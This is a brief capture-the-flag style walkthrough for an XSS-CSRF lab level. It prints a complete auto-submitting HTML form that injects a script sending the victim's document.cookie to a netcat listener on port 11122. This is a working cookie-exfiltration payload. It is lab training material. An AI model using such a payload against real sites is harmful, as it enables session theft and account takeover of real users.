This level is very similar to the previous level, it's also an XSS-CSRF attack, except this time, we'll need to send the cookie of the user to our `netcat` server. So it's basically like CSRF 3 + XSS 7.

We can just modify our CSRF 3's XSS payload with the XSS 7 payload. We grab the cookie and send it to our `netcat` server listening on port 11122.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form method="GET" action="http://challenge.localhost/ephemeral">
<input type="hidden" name="msg" value='<script>fetch("http://127.0.0.1:11122",{method:"POST",body:document.cookie})</script>'>
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```